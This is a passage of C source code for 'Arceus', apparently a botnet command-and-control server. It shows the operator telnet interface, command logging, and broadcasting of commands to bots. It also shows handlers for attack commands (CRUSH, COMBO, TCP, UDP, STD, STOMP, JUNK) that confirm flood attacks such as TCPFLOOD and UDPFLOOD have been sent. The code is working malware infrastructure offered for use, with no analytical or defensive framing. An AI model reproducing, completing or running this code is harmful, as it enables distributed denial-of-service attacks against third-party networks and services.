                        uint32_t header_parser = 0; // Let's Create A Header Parse, Under 32-bit Unsigned Integer, This Allows Accurate Value Statement
                        while (header_parser != 0x0D0A0D0A) // Set Header Parse Value = '0x0D0A0D0A'
                        {
                            if ((retrv = read(IPLSock, &ch, 1)) != 1) // Check For Success, Using IPL Sock
                                break;
                
                            header_parser = (header_parser << 8) | ch; // Change Parser Value, Below '8'
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer)); // Fill Data Block, Stabilises On-going Process, Using Socket-Buffer
                        while(ret = read(IPLSock, iplbuffer, 1024)) // Set Ret, To Read -- Buffer Size Stated Coherently, [1024]
                        {
                            iplbuffer[ret] = '\0'; // Break, Below Is An Alternative If A Second Function Is Added
                            /*if(strlen(iplbuffer) > 1)
                                printf("\x1b[36m%s\x1b[37m\n", buffer);*/
                        }
                        //printf("%s\n", iplbuffer); <---- This Would Be Used, If No Error Handling Is Needed. The User Will Not Be Informed With DETAILS
                        if(strstr(iplbuffer, "<title>404")) // Use Header Title + Error 404 [Assumption Error = 404]
                        {
                            char iplookup_host_token[20]; // Char Every Line For Output Communication
                            sprintf(iplookup_host_token, "%s", iplookup_host); // %s Is Our Host Token, Set This As Our DISPLAY Variable
                            int ip_prefix = atoi(strtok(iplookup_host_token, ".")); // Create Integer For The IP Prefix, This Is Defined Using Our Received host_token
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, API can't be located on server %d.*.*.*:80\x1b[0m\r\n", ip_prefix); // Error Handling -- No API Was Found, Defined By Host Token
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token)); // Fill Data Block Again, We Do This For Every Function, To Stop Instability and Saturation
                        }
                        else if(strstr(iplbuffer, "nickers")) // Hehe.. ( ͡° ͜ʖ ͡°)
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, Hosting server needs to have php installed for api to work...\x1b[0m\r\n"); // Error Handling, Hosting Has No PHP.. 
                        else sprintf(botnet, "[+] \x1b[0m--- Results\x1b[0m --- [+]\r\n\x1b[0m%s\x1b[37m\r\n", iplbuffer); // Output Results, From IP Lookup
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
                    }
                    else
                    {
                        //printf("[\x1b[31m-\x1b[37m] Failed to send request headers...\n");
                        sprintf(botnet, "\x1b[31m[IPLookup] Failed to send request headers...\r\n"); // Header Send[ Failed -- Probably Due To Some Sort Of DDoS Protection, [Cloudflare, Blazing, Etc..]
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
                    }
                }
                close(IPLSock); // Terminate Allocated Statement, Open Socket, May Cause Numerous Network Problems If Not Killed...
            }
        }
        if(strstr(buf, ".logout")  || strstr(buf, ".LOGOUT")) // Logout Command, So The User Exits Safely And In Fashion.. Of course...
        {
        printf("\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mHas Logged Out!\n", accounts[find_line].user, buf); // We Are Attempting To Logout!
        FILE *logFile;// We Are Attempting To Logout!
        logFile = fopen("logs/Arceus_Logout.log", "a");// We Are Attempting To Logout!
        fprintf(logFile, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m]\e[38;5;202m User\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\e[38;5;202m Has Logged Out!\n", accounts[find_line].user, buf);// We Are Attempting To Logout!
        fclose(logFile);// We Are Attempting To Logout!
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "STOP")) // STOP OUR ATTACK
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "              \e[38;5;201m╔═══════════════════════════════╗\r\n              \e[38;5;201m║      \e[38;5;202mWhy did you stop? ):     \e[38;5;201m║\r\n              \e[38;5;201m║  \e[38;5;202mTesting something perhaps?   \e[38;5;201m║\r\n              \e[38;5;201m║  \e[38;5;202mMeh, its oki, i stopped </3  \e[38;5;201m║\r\n              \e[38;5;201m╚═══════════════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "CRUSH")) // CRUSH ATTACK
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: CRUSH        \e[38;5;201m╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: STD x TCP     \e[38;5;201m║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "COMBO")) // COMBO ATTACK
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: COMBO        \e[38;5;201m╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: JUNK x HOLD   \e[38;5;201m║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "TCP")) // TCP ATTACK
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: TCP          \e[38;5;201m╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: TCPFLOOD      \e[38;5;201m║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "UDP")) // UDP ATTACK
        {  // Let Us Continue Our Journey! ╚═════════════════════════════╝ X 31 ||  
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: UDP         \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: UDPFLOOD     \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "STD")) // STD ATTACK
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!      \e[38;5;201m   ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: STD       \e[38;5;201m   ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: STDFLOOD   \e[38;5;201m   ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "STOMP")) // STOMP ATTACK
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!           \e[38;5;201m║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: STOMP          \e[38;5;201m╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: UDP x STD x TCP \e[38;5;201m║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚════════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "JUNK")) // JUNK ATTACK
        {  // Let Us Continue Our Journey! ╚══════════════════════╝ x 24 || ╔════════════════════════╗ x 26
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: JUNK        \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: JUNKFLOOD    \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if (strstr(buf, "EXIT") || strstr(buf, "exit"))  // We Are Closing Connection!
        { // Let Us Continue Our Journey!
        goto end; // We Are Dropping Down to end:
        } // Let Us Continue Our Journey!
        trim(buf);
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // User Input - Hostname
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(strlen(buf) == 0) continue;
        printf("\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;201m- \e[38;5;202mCommand\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\n",accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("logs/Arceus_C2.log", "a"); // Log Our User -- Just In Case There Are 'Certain Problems'
        fprintf(logFile, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;93m- \e[38;5;202mCommand\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\n", accounts[find_line].user, buf);
        fclose(logFile); // Close The Log File
        broadcast(buf, thefd, usernamez); // Broadcast The Following Stated -- [Buffer, thefd, Usernames]
        memset(buf, 0, 2048); // Set Data Block And Buffer Size --> 0 -- 2048
        } // Let Us Continue Our Journey!
        end:    // cleanup dead socket
        managements[thefd].connected = 0; // Managments Connected, Decrease Value To The Following Value
        close(thefd); // Close..
        managesConnected--; // Display New Value [May Change Output Sequence Later.. It Is Quite Stable]
}
 
void *telnetListener(int port) // Void, Certain Elements That Will Tailor The Client... [SOCKET INTERPRETATION II.2] -- [STILL IN BETA STAGES, WORK IN PROGRESS...]
{    
        int sockfd, newsockfd; // Create Integer For Socket-Feed, New Socket Feed, Automatically Will Write A New Call -- 
        socklen_t clilen; // New Call Name - Unecessary, But Just Incase, Compiling Is Very Needy And Dependent..
        struct sockaddr_in serv_addr, cli_addr; // Create Struct. For Socket Address.. This Will Subside With Client Address
        sockfd = socket(AF_INET, SOCK_STREAM, 0); // New Socket Interpreter -- [Made By Zach, I Will Change Subsiding Unit Once Connection Has Been Made]
        if (sockfd < 0) perror("ERROR opening socket"); // Socket Error Handling, The Stated Integer Value SHOULD NOT Be Greater Than 0 If So, Display Error
        bzero((char *) &serv_addr, sizeof(serv_addr)); // We Will Char An Output Communication Towards The Socket, The Broadcast Will Be Constant
        serv_addr.sin_family = AF_INET; // Our Socket Properties Will Be Set, Using AF_INET. Everything Together = Sin.Family
        serv_addr.sin_addr.s_addr = INADDR_ANY; // Sin Address, Is The Internet Address, It Will Be Set Due To The Client Sending An Income Packet [Test Packet]
        serv_addr.sin_port = htons(port); // Using 'htons' We Will Convert The Port Value, Into A Network Integer For The Server To Communicate Properly
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("[Arceus] Screening Error"); // Error Handling Output - Probably Using The Same Port As The Listener
        listen(sockfd,5); // Use Listen Function - Using The '5' Value
        clilen = sizeof(cli_addr); // Define 'clilen' With The Size Of Our Client Address [ User Connecting To The C2 ]
        while(1)
        {  printf("\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mIncoming User Connection From "); // Client Size == The IP Of The User Connecting
       
        client_addr(cli_addr); // Set Client Address, As Variable In Order To Log
        FILE *logFile; // Use LogFILE Function
        logFile = fopen("logs/Arceus_Connection.log", "a"); // Create Our Log File..                           |Here Is The Output On The Admin Screen|
        fprintf(logFile, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mIncoming User Connection From \e[38;5;202mIP:\e[38;5;93m[\e[38;5;202m%d.%d.%d.%d\e[38;5;93m]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile); // Close Our Log File, After Connection [Client Address] Has Been Logged..
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen); // Accept New Socket, Minimises Error Of Binding Failure
        if (newsockfd < 0) perror("ERROR on accept"); // Output An Acceptance -- Something's Went Wrong -- Hard To Detail
        pthread_t thread; // Use Pthread, To Set All Network Functions As One Thread -- [So We Can Parse Threads To The Client]
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd); // Create The Thread '&thread, NULL, &telnetWorker, (void *)newsockfd'
        }
}
 
int main (int argc, char *argv[], void *sock) // Set Integers For Arguements - Then Char For Output Communication
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port; // Creating Integers For 'Threads & Port'
        struct epoll_event event; // Create Struct, For EPOLL, We Will Use This For Our Sockets
        if (argc != 4) // Set Argument Value, [Default Execution Output Argument Value]
        {
        fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]); // Display Help [Only If All Arguments Have Not Been Applied]
        exit (EXIT_FAILURE); // No Failure, Just No Arguments
        }
        port = atoi(argv[3]); // Set Argument Value '3' - For Port
        threads = atoi(argv[2]); // Set Argument Value '2' - For Threads
        if (threads > 1000) // Thread Limit - Change It If You Want - These Are My Recommendations
        {
        printf("[Arceus] Thread Limit Exceeded! Please Lower Threat Count!\n"); // Are You Stupid? - Do You Wanna Really Try To Broadcast With EXTREME Network Output??
        return 0; // Kill
        }
        else if (threads < 1000) // You Have Picked A Reasonible Thread Number - Thank You For Listening To Me :)
        {
        printf(""); // printf("Well Done You Absolute Uncultured Swine, You Aren't A Skid After All...");
        }
        printf("\e[38;5;201m╔═══════════════════════════════════╗\r\n\e[38;5;201m║         \e[38;5;93mWelcome To Arceus         \e[38;5;201m║\r\n\e[38;5;201m║         \e[38;5;93mC2 x Telnet Layer         \e[38;5;201m╠════════╗\r\n\e[38;5;201m║  \e[38;5;93mServer Is Sucessfully Screened!  \e[38;5;201m║        ║     ╔════════════════════════╗\r\n\e[38;5;201m╚═════╦═════════════════════════════╝        ╚═════╣ \e[38;5;93mCreated By Jack x Zach \e[38;5;201m║\r\n      \e[38;5;201m║                                            ╚═════╦══════════════════╝\r\n      \e[38;5;201m║   ╔════╗                                         \e[38;5;201m║\r\n      \e[38;5;201m╚═══╣ \e[38;5;93m<3 \e[38;5;201m╠═════╗         ╔════════════╗            \e[38;5;201m║\r\n          \e[38;5;201m╚════╝     ║         ║ \e[38;5;93mRIP Katura \e[38;5;201m╠════════════╝\r\n                     \e[38;5;201m║         ╚═══╦════════╝\r\n                     \e[38;5;201m║             ║\r\n                     \e[38;5;201m║             ║\r\n                     \e[38;5;201m╚═════════════╝\r\n");
        listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort(); // Killing Myself
    
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort(); // Killing Myself
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1) // Check If I Wanna Die..
        {
        perror ("listen"); // Listen - Error
        abort (); // Yep, I wanna die..
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1) // Check If I Wanna Die Again..
        {
        perror ("epoll_create"); // EPOLL_ERROR - Yeah...
        abort (); // Okay Sure, Let's Die..
        }
        event.data.fd = listenFD; // EPOLL_EVENT DATA
        event.events = EPOLLIN | EPOLLET; // EPOLL_USE MODULES
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event); // EPOLL_USE_MODULES -- USE FUNCTION : (epollFD, EPOLL_CTL_ADD, listenFD, &event)
        if (s == -1) // Check If I Wanna Die Again..
        {
        perror ("epoll_ctl");
        abort (); // Yeah, Let's Die.. One More Time..
        }
        pthread_t thread[threads + 2]; // Use Pthread Thread + 2, Because We Want A Strong Independent Connection
        while(threads--) // While [Thread Count]
        {
        pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port); // Make A Thread To Individually Subside The Network Functions To The Client
        while(1) // Let's Wait A WHILE... [1 Second.. We Want Stability.. Right??]
        {
        broadcast("PING", -1, "STRING"); // Broadcast
        sleep(60); // Lemme Sleep The Thread For 60 Seconds..
        }
        close (listenFD); // Close The Listening FileD, Socket -- Terminate Concurrent Function
        return EXIT_SUCCESS; // Exit Successfully, Using Return Statement.
} // Arceus I [BETA] - 8